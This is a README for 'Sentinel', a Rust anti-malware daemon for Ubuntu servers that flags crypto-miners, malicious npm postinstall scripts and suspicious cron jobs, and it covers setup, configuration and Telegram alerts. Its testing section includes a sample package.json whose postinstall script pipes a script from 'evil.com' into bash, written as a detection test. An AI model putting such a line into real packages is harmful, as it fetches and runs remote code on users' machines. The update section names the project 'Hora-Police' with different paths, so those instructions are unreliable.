# 🛡️ Sentinel Anti-Malware Daemon

A high-performance, intelligent anti-malware daemon specifically designed for Ubuntu VPS environments. Sentinel detects and neutralizes crypto-mining malware, npm supply-chain attacks, and other CPU-abusing threats with minimal system overhead.

## 🎯 Features

- **CPU Abuse Detection**: Monitors all processes and flags those consuming >20% CPU for ≥5 minutes
- **Behavior Intelligence**: Learns from past actions and builds threat profiles
- **Cron Surveillance**: Continuously monitors cron jobs for suspicious patterns
- **npm Supply-Chain Detection**: Identifies malicious packages and post-install scripts
- **React Abuse Detection**: Heuristic-based detection of crypto miners hidden in React handlers
- **Forensic Logging**: All actions logged to SQLite database
- **Telegram Reporting**: Daily summaries and optional real-time alerts
- **Ultra-Low Overhead**: <1% CPU, <40MB RAM

## 🏗️ Architecture

```
┌─────────────────────────────┐
│  Sentinel Daemon (Rust)     │
├─────────────────────────────┤
│ Process Monitor             │
│ CPU Time Analyzer           │
│ Cron Watcher                │
│ npm Infection Scanner       │
│ React Abuse Detector        │
│ Behavior Intelligence DB    │
│ Kill Engine                 │
│ Telegram Reporter           │
└─────────────────────────────┘
```

## 📦 Installation

### Prerequisites

- Ubuntu 20.04+ (or compatible Linux distribution)
- Rust 1.70+ (`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)
- Root/sudo access
- SQLite3 development libraries: `sudo apt-get install libsqlite3-dev`

### Build

```bash
# Clone or navigate to the project directory
cd sentinel-daemon

# Build in release mode
cargo build --release

# The binary will be at: target/release/sentinel-daemon
```

### Installation Steps

1. **Copy binary to system path:**
   ```bash
   sudo cp target/release/sentinel-daemon /usr/local/bin/sentinel-daemon
   sudo chmod +x /usr/local/bin/sentinel-daemon
   ```

2. **Create configuration directory:**
   ```bash
   sudo mkdir -p /etc/sentinel
   sudo mkdir -p /var/lib/sentinel
   ```

3. **Create configuration file:**
   ```bash
   sudo cp config.toml.example /etc/sentinel/config.toml
   sudo nano /etc/sentinel/config.toml  # Edit as needed
   ```

4. **Install systemd service:**
   ```bash
   sudo cp sentinel.service /etc/systemd/system/
   sudo systemctl daemon-reload
   sudo systemctl enable sentinel
   sudo systemctl start sentinel
   ```

5. **Verify it's running:**
   ```bash
   sudo systemctl status sentinel
   sudo journalctl -u sentinel -f  # View logs
   ```

## 🔄 Updating

Hora-Police can be updated with a single command that handles the complete workflow:

### Quick Update

```bash
cd /srv/Hora-Police
sudo ./scripts/update.sh
```

This command will:
- Check current version vs latest version
- Backup current binary automatically
- Pull latest code from git
- Build new binary
- Install and restart service
- Verify service is running
- Rollback automatically on failure

### Update Options

```bash
# Preview changes without applying (dry-run)
sudo ./scripts/update.sh --dry-run

# Force update even if versions match
sudo ./scripts/update.sh --force

# Update from specific branch
sudo ./scripts/update.sh --branch=fix/systemd-install

# Check current version
/usr/local/bin/hora-police --version
```

### Safety Features

- **Automatic Backup**: Current binary is backed up to `/var/lib/hora-police/backups/` before update
- **Automatic Rollback**: If update fails, previous version is automatically restored
- **Version Check**: Skips update if already up-to-date (unless `--force` is used)
- **Logging**: All update actions logged to `/var/log/hora-police/update.log`

### Manual Update Steps

If you prefer to update manually:

```bash
cd /srv/Hora-Police
git pull
./build-lowmem.sh
cp target/release/hora-police /tmp/hora-police
sudo ./scripts/install-binary.sh
```

## ⚙️ Configuration

Edit `/etc/sentinel/config.toml`:

```toml
cpu_threshold = 20.0              # CPU % threshold
duration_minutes = 5               # Duration before flagging
real_time_alerts = false           # Real-time Telegram alerts
auto_kill = true                   # Auto-kill malicious processes
learning_mode = true               # Build intelligence database
database_path = "/var/lib/sentinel/intelligence.db"
polling_interval_ms = 5000         # Check interval (5 seconds)
threat_confidence_threshold = 0.7  # Kill threshold (0.0-1.0)

[telegram]
bot_token = "YOUR_BOT_TOKEN"
chat_id = "@mjpavithra"
daily_report_time = "09:00"
```

## 📱 Telegram Setup

1. **Create a bot:**
   - Message [@BotFather](https://t.me/BotFather) on Telegram
   - Send `/newbot` and follow instructions
   - Copy the bot token

2. **Get your chat ID:**
   - Message [@userinfobot](https://t.me/userinfobot)
   - Copy your chat ID (or use your username with @)

3. **Update config:**
   ```toml
   [telegram]
   bot_token = "123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
   chat_id = "@mjpavithra"
   daily_report_time = "09:00"
   ```

4. **Restart daemon:**
   ```bash
   sudo systemctl restart sentinel
   ```

## 🔍 Threat Model

Sentinel protects against:

1. **Crypto-Mining Malware**
   - Detects processes with sustained high CPU usage
   - Identifies known miner binaries and patterns
   - Monitors for respawn behavior

2. **npm Supply-Chain Attacks**
   - Scans package.json and node_modules
   - Detects suspicious post-install scripts
   - Identifies known malicious packages

3. **Cron-Based Persistence**
   - Monitors all cron locations
   - Detects obfuscated commands
   - Flags base64 payloads and suspicious patterns

4. **React Flight Protocol Abuse**
   - Heuristic detection of miners in React handlers
   - Identifies long-running deserialization loops
   - Detects crypto-related code in React processes

## 🧪 Testing

### Simulate CPU Abuse

```bash
# Create a test script that hogs CPU
cat > /tmp/test_miner.sh << 'EOF'
#!/bin/bash
while true; do
    :  # Infinite loop
done
EOF
chmod +x /tmp/test_miner.sh
/tmp/test_miner.sh &
```

Sentinel should detect and kill this process within 5 minutes.

### Test npm Detection

```bash
# Create a suspicious package.json
mkdir -p /tmp/test-npm
cd /tmp/test-npm
cat > package.json << 'EOF'
{
  "name": "test-package",
  "scripts": {
    "postinstall": "curl http://evil.com/script.sh | bash"
  }
}
EOF
```

## 📊 Monitoring

### View Logs

```bash
# Systemd logs
sudo journalctl -u sentinel -f

# Database queries
sqlite3 /var/lib/sentinel/intelligence.db

# Example queries:
SELECT * FROM kill_actions ORDER BY timestamp DESC LIMIT 10;
SELECT * FROM suspicious_processes WHERE threat_confidence > 0.7;
SELECT * FROM npm_infections;
```

### Performance Monitoring

```bash
# Check daemon resource usage
ps aux | grep sentinel-daemon
top -p $(pgrep sentinel-daemon)
```

## 🔐 Security Considerations

- **Privilege Escalation**: Runs as root to monitor all processes (required)
- **File Access**: Hardened with systemd security options
- **Network**: Only outbound HTTPS to Telegram API
- **Logging**: Tamper-resistant SQLite database
- **Kill Safety**: Never kills system processes (whitelist protected)

## 🛠️ Troubleshooting

### Daemon won't start

```bash
# Check configuration syntax
sentinel-daemon /etc/sentinel/config.toml

# Check permissions
ls -la /var/lib/sentinel/
sudo chown root:root /var/lib/sentinel/
```

### False Positives

- Adjust `threat_confidence_threshold` (increase to be less aggressive)
- Add safe binaries to whitelist in `process_monitor.rs`
- Enable `learning_mode` to build better intelligence

### High Resource Usage

- Increase `polling_interval_ms` (e.g., 10000 for 10 seconds)
- Reduce database retention (implement cleanup job)

## 📈 Performance

- **CPU Usage**: <1% average
- **Memory**: 30-40MB
- **Database Size**: ~10MB per 100k process records
- **Network**: Minimal (only Telegram API calls)

## 🚀 Future Enhancements

- [ ] eBPF integration for kernel-level hooks
- [ ] Machine learning threat scoring
- [ ] Web dashboard
- [ ] Integration with fail2ban
- [ ] Docker container support
- [ ] Prometheus metrics export

## 📝 License

MIT License - See LICENSE file for details

## 🤝 Contributing

This is a security-critical daemon. Contributions welcome, but please:
1. Test thoroughly
2. Document security implications
3. Follow Rust best practices
4. Maintain performance targets

## ⚠️ Disclaimer

This tool is designed for VPS environments. Use at your own risk. Always test in a non-production environment first. The authors are not responsible for any damage caused by misuse.

---

**Built with ❤️ for secure VPS environments**

